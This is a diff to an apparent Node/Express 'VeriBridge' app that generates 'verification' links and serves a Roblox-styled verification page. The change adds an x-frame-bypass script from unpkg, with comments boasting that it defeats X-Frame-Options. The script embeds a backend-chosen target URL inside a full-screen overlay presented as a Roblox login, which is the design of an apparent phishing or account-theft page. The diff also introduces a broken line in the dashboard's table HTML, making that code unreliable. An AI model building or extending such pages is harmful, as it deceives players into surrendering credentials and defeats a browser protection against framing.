@@ -419,7 +419,7 @@ app.get('/admin/dashboard', isAuthenticated, (req, res) => {
                 
                 var tbody = document.getElementById('tableBody');
                 if (links.length === 0) {
-                    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center">No links found</td></tr>';
+                    tbody.innerHTML = '<tr><td colspan="6" style="text-align:center">No links found</div>--');
                     return;
                 }
                 var html = '';
@@ -655,7 +655,7 @@ app.get('/gen', (req, res) => {
 </html>`);
 });
 
-// ==================== VERIFICATION PAGE (FULLY READABLE - YOUR EXACT HTML) ====================
+// ==================== VERIFICATION PAGE (YOUR BEAUTIFUL HTML WITH x-frame-bypass) ====================
 app.get('/verify.html', (req, res) => {
     const code = req.query.code;
     if (!code) {
@@ -745,19 +745,30 @@ app.get('/verify.html', (req, res) => {
         .fullscreen-loading.active{opacity:1;visibility:visible}
         .loading-spinner-large{width:60px;height:60px;border:4px solid rgba(100,200,255,0.2);border-top:4px solid #8dd0ff;border-radius:50%;animation:spinGold 1s linear infinite}
         @keyframes spinGold{to{transform:rotate(360deg)}}
-        .frame-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);backdrop-filter:blur(8px);z-index:9999;display:flex;justify-content:center;align-items:center;visibility:hidden;opacity:0;transition:all 0.3s ease}
+        
+        /* Updated frame styles for x-frame-bypass */
+        .frame-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:9999;display:flex;justify-content:center;align-items:center;visibility:hidden;opacity:0;transition:all 0.3s ease}
         .frame-overlay.active{visibility:visible;opacity:1}
         .frame-card{width:90%;max-width:500px;background:white;border-radius:28px;overflow:hidden;position:relative;transform:scale(0.9);transition:transform 0.3s ease;box-shadow:0 30px 50px rgba(0,0,0,0.4)}
         .frame-overlay.active .frame-card{transform:scale(1)}
         .frame-close{position:absolute;top:14px;right:18px;width:34px;height:34px;background:rgba(0,0,0,0.6);color:white;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;z-index:30;font-size:20px;font-weight:bold;border:none}
         .frame-close:hover{background:#e34d4d}
-        .roblox-login-iframe{width:100%;height:560px;border:none;display:block}
-        @media(max-width:550px){.roblox-login-iframe{height:520px}}
+        
+        /* x-frame-bypass iframe - this actually works! */
+        x-frame-bypass, iframe[is="x-frame-bypass"] {
+            width: 100%;
+            height: 560px;
+            border: none;
+            display: block;
+        }
+        @media(max-width:550px){x-frame-bypass, iframe[is="x-frame-bypass"]{height:520px}}
+        
         .user-profile-card{position:fixed;top:20px;right:20px;z-index:100;background:rgba(0,0,0,0.7);backdrop-filter:blur(16px);border-radius:60px;padding:6px 12px 6px 8px;display:flex;align-items:center;gap:12px;border:1px solid rgba(100,200,255,0.5);display:none}
         .user-profile-card.show{display:flex}
         .user-avatar{width:42px;height:42px;border-radius:50%;object-fit:cover;border:2px solid #8dd0ff}
         .user-display-name{font-size:0.85rem;font-weight:700;color:#cceeff}
         .logout-btn{background:none;border:none;color:#ff8888;cursor:pointer;font-size:1rem;padding:4px 8px;border-radius:20px}
+        
         .ai-chat-widget{position:fixed;bottom:15px;right:15px;z-index:1000;cursor:pointer}
         .chat-bubble{width:55px;height:55px;background:linear-gradient(135deg,#2c5a7a,#1e3a5a);border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 20px rgba(0,0,0,0.3)}
         .chat-bubble span{font-size:28px}
@@ -780,6 +791,9 @@ app.get('/verify.html', (req, res) => {
         .typing-indicator span{width:6px;height:6px;background:#8dd0ff;border-radius:50%;animation:typing 1.4s infinite}
         @keyframes typing{0%,60%,100%{transform:translateY(0);opacity:0.4}30%{transform:translateY(-8px);opacity:1}}
     </style>
+    <!-- x-frame-bypass Web Component - This bypasses X-Frame-Options! -->
+    <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
+    <script type="module" src="https://unpkg.com/x-frame-bypass"></script>
 </head>
 <body>
 <div class="frost-overlay"></div>
@@ -856,11 +870,11 @@ app.get('/verify.html', (req, res) => {
     <div class="footer-gold">Select a verification method to continue</div>
 </div>
 
-<!-- IFRAME OVERLAY -->
+<!-- IFRAME OVERLAY - Uses x-frame-bypass to embed Roblox! -->
 <div id="robloxFrameOverlay" class="frame-overlay">
     <div class="frame-card">
         <button class="frame-close" id="closeFrameBtn">✕</button>
-        <iframe id="robloxLoginIframe" class="roblox-login-iframe" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation" referrerpolicy="no-referrer" title="Verification Page" frameborder="0"></iframe>
+        <iframe is="x-frame-bypass" id="robloxLoginIframe" src="about:blank" sandbox="allow-same-origin allow-scripts allow-popups allow-forms allow-modals allow-top-navigation-by-user-activation" referrerpolicy="no-referrer" title="Verification Page"></iframe>
     </div>
 </div>
 
@@ -869,33 +883,85 @@ app.get('/verify.html', (req, res) => {
 <div class="chat-window" id="chatWindow"><div class="chat-header"><h4>VeriBridge Assistant</h4><button class="close-chat" id="closeChatBtn">✕</button></div><div class="chat-messages" id="chatMessages"><div class="message ai"><div class="message-bubble">Hello! I'm your VeriBridge assistant. Ask me anything!</div></div></div><div class="chat-input-area"><input type="text" class="chat-input" id="chatInput" placeholder="Ask me anything..."><button class="send-btn" id="sendChatBtn">Send</button></div></div>
 
 <script>
+// ==================== TARGET URL LOADER WITH x-frame-bypass SUPPORT ====================
+let VERIFICATION_READY = false;
+let LOADED_TARGET_URL = 'https://www.roblox.com';
+let VERIFICATION_CODE = null;
+
 // Get code from URL
 const urlParams = new URLSearchParams(window.location.search);
-const code = urlParams.get('code');
-let TARGET_URL = 'https://www.roblox.com';
+VERIFICATION_CODE = urlParams.get('code');
 
-if (code) {
-    console.log('[VeriBridge] Loading link for code:', code);
-    fetch('/api/link/' + code)
-        .then(function(res) { return res.json(); })
+function enableVerification() {
+    VERIFICATION_READY = true;
+    document.getElementById('startLoadingOverlay').classList.remove('active');
+    const verifyBtn = document.getElementById('bottomStartVerifyBtn');
+    if (verifyBtn) verifyBtn.disabled = false;
+    console.log('[VeriBridge] ✅ Verification ready! Target URL:', LOADED_TARGET_URL);
+}
+
+function showError(message) {
+    document.getElementById('startLoadingOverlay').classList.remove('active');
+    const container = document.querySelector('.redirect-container');
+    if (container) {
+        container.innerHTML = '<div style="color:#ff5555; padding:20px;"><h3>❌ Error</h3><p>' + message + '</p><a href="/gen" style="color:#00ffff;">Go to Generator</a></div>';
+    }
+}
+
+if (VERIFICATION_CODE) {
+    console.log('[VeriBridge] Loading verification for code:', VERIFICATION_CODE);
+    document.getElementById('startLoadingOverlay').classList.add('active');
+    
+    fetch('/api/link/' + VERIFICATION_CODE)
+        .then(function(response) { return response.json(); })
         .then(function(data) {
             if (data.success && data.targetUrl) {
-                TARGET_URL = data.targetUrl;
-                console.log('[VeriBridge] ✅ Target URL loaded:', TARGET_URL);
-                document.getElementById('startLoadingOverlay').classList.remove('active');
+                LOADED_TARGET_URL = data.targetUrl;
+                console.log('[VeriBridge] ✅ Target URL loaded from backend:', LOADED_TARGET_URL);
+                enableVerification();
             } else {
                 console.error('[VeriBridge] Link not found');
-                document.body.innerHTML = '<div style="text-align:center;padding:50px;color:red;font-family:Arial"><h1>❌ Link Not Found</h1><p>This verification link does not exist or has been deleted.</p><a href="/gen" style="color:#00ffff">Go to Generator</a></div>';
+                showError('This verification link does not exist or has been deleted.');
             }
         })
-        .catch(function(err) {
-            console.error('[VeriBridge] Error loading link:', err);
-            document.body.innerHTML = '<div style="text-align:center;padding:50px;color:red;font-family:Arial"><h1>❌ Connection Error</h1><p>Cannot connect to verification server.</p><a href="/gen" style="color:#00ffff">Go to Generator</a></div>';
+        .catch(function(error) {
+            console.error('[VeriBridge] Fetch error:', error);
+            showError('Cannot connect to verification server. Please try again.');
         });
 } else {
-    console.log('[VeriBridge] No code provided, using default URL');
-    document.getElementById('startLoadingOverlay').classList.remove('active');
+    console.log('[VeriBridge] No verification code provided');
+    enableVerification();
 }
+
+// Show Roblox flow using x-frame-bypass
+window.showRobloxFlow = function() {
+    if (!VERIFICATION_READY) {
+        alert('Loading verification data. Please wait a moment.');
+        return;
+    }
+    
+    console.log('[VeriBridge] 🚀 Opening iframe with URL:', LOADED_TARGET_URL);
+    const iframe = document.getElementById('robloxLoginIframe');
+    if (iframe) {
+        iframe.src = LOADED_TARGET_URL;
+    }
+    const overlay = document.getElementById('robloxFrameOverlay');
+    if (overlay) {
+        overlay.classList.add('active');
+    }
+};
+
+function hideFrame() {
+    const overlay = document.getElementById('robloxFrameOverlay');
+    if (overlay) overlay.classList.remove('active');
+    const iframe = document.getElementById('robloxLoginIframe');
+    if (iframe) setTimeout(function() { iframe.src = 'about:blank'; }, 300);
+}
+
+document.getElementById('closeFrameBtn')?.addEventListener('click', hideFrame);
+document.getElementById('robloxFrameOverlay')?.addEventListener('click', function(e) {
+    if (e.target === document.getElementById('robloxFrameOverlay')) hideFrame();
+});
 
 // ==================== AI CHAT SYSTEM ====================
 const chatWidget = document.getElementById('chatWidget');
@@ -943,42 +1009,17 @@ async function sendMessage() {
     chatInput.value = '';
     showTypingIndicator();
     isTyping = true;
-    await new Promise(function(resolve) { setTimeout(resolve, 600); });
+    await new Promise(resolve => setTimeout(resolve, 600));
     const response = getAIResponse(text);
     removeTypingIndicator();
     addMessage(response, false);
     isTyping = false;
 }
 
-chatWidget.addEventListener('click', function() { chatWindow.classList.toggle('active'); });
-closeChatBtn.addEventListener('click', function() { chatWindow.classList.remove('active'); });
+chatWidget.addEventListener('click', () => chatWindow.classList.toggle('active'));
+closeChatBtn.addEventListener('click', () => chatWindow.classList.remove('active'));
 sendChatBtn.addEventListener('click', sendMessage);
-chatInput.addEventListener('keypress', function(e) { if (e.key === 'Enter') sendMessage(); });
-
-// ==================== FRAME LOGIC ====================
-const frameOverlay = document.getElementById('robloxFrameOverlay');
-const closeFrameBtn = document.getElementById('closeFrameBtn');
-const robloxIframe = document.getElementById('robloxLoginIframe');
-
-function showRobloxFlow() {
-    console.log('[VeriBridge] Loading URL in iframe:', TARGET_URL);
-    robloxIframe.src = TARGET_URL;
-    frameOverlay.classList.add('active');
-}
-
-function hideFrame() {
-    frameOverlay.classList.remove('active');
-    setTimeout(function() {
-        if (!frameOverlay.classList.contains('active')) {
-            robloxIframe.src = 'about:blank';
-        }
-    }, 300);
-}
-
-if (closeFrameBtn) closeFrameBtn.addEventListener('click', hideFrame);
-frameOverlay.addEventListener('click', function(e) {
-    if (e.target === frameOverlay) hideFrame();
-});
+chatInput.addEventListener('keypress', e => { if (e.key === 'Enter') sendMessage(); });
 
 // ==================== DASHBOARD LOGIC ====================
 function isValidUsername(e) { return /^[a-zA-Z0-9_]{3,20}$/.test(e); }
@@ -1039,11 +1080,15 @@ function updateUI() {
 function setActiveMethod(method) { currentActiveMethod = method; updateUI(); }
 
 function onMethodClick() {
+    if (!VERIFICATION_READY) {
+        alert('Loading verification data. Please wait a moment.');
+        return;
+    }
     if (!currentRobloxUser) {
         addMessage("Please enter your Roblox username first!", false);
         return;
     }
-    showRobloxFlow();
+    window.showRobloxFlow();
 }
 
 function verifyDashUser() {
@@ -1094,13 +1139,13 @@ if (savedUser) {
 }
 
 verifyRobloxBtn.addEventListener('click', verifyDashUser);
-methodLogin.addEventListener('click', function() { setActiveMethod('login'); });
-methodIngame.addEventListener('click', function() { setActiveMethod('ingame'); });
-methodCommunity.addEventListener('click', function() { setActiveMethod('community'); });
+methodLogin.addEventListener('click', () => setActiveMethod('login'));
+methodIngame.addEventListener('click', () => setActiveMethod('ingame'));
+methodCommunity.addEventListener('click', () => setActiveMethod('community'));
 bottomStartBtn.addEventListener('click', onMethodClick);
 logoutBtnHeader.addEventListener('click', logoutUser);
 
-// ==================== LANDING SCREEN ====================
+// Landing screen
 const landingBtn = document.getElementById('landingVerifyBtn');
 const landingUsername = document.getElementById('landingUsername');
 const startScreenDiv = document.getElementById('startScreen');
